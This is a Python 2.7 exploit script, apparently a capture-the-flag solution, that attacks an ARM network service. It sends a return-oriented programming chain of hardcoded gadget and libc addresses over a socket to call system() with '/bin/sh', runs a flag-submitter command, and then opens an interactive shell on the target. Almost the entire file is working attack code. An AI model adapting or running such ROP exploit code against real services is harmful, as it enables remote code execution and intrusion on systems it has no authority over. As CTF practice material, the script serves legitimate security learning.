#!/usr/bin/env python2.7

import socket
import struct
import sys
import telnetlib
import time

if len(sys.argv) == 3:
    ADDR = sys.argv[1]
    PORT = int(sys.argv[2])
else:
    ADDR = "localhost"
    PORT = 8888

DBG = True

s = socket.create_connection((ADDR, PORT))

def p64(a):
    return struct.pack("<Q", a)

def u64(s):
    return struct.unpack("<Q", s)[0]

def p32(a):
    return struct.pack("<I", a)

def u32(s):
    return struct.unpack("<I", s)[0]

def rtil(st):
    buf = ""
    x = 0
    while True:
        curr = s.recv(1)
        if curr == "":
            break
        buf += curr
        if(curr == st[x]):
            x += 1
            if x == len(st):
                break
        else:
            x = 0
    if DBG:
        sys.stdout.write(buf)
        sys.stdout.flush()
    return buf

def send_n(n):
    rtil("<< ")
    s.send(str(n) + "\n")

for i in range(18):
    send_n(0)

mover = 0x10804 # r7 r8 r9
popper = 0x1081c # pop	{r3, r4, r5, r6, r7, r8, r9, pc
write = 0x104B4
off2sys = 0x02d4cd
off2sys =  0x2c771
#lc_base = 0xff6c3000
lc_base = 0xf66e1000
#system = lc_base + off2sys
system = -160376975
system = -9501491
print hex(system)

#rop = [0x42424242]
rop = []
binsh = 0x22010
rop += [popper, system, 0x4, 0x5, 0x6, binsh, 0x00021fd8, 0x4, mover]
#rop += [popper, write, 0x4, 0x5, 0x6, 1, 0x10EDC, 0x100, mover]

#!!!!!!
for p in rop:
    send_n(p)

rtil("<< ")
s.send("/home/ctf/flag_submitter acez")

rtil("<< ")
s.shutdown(socket.SHUT_WR) # read end will be closed,hmmm

t = telnetlib.Telnet()
t.sock = s
t.interact()
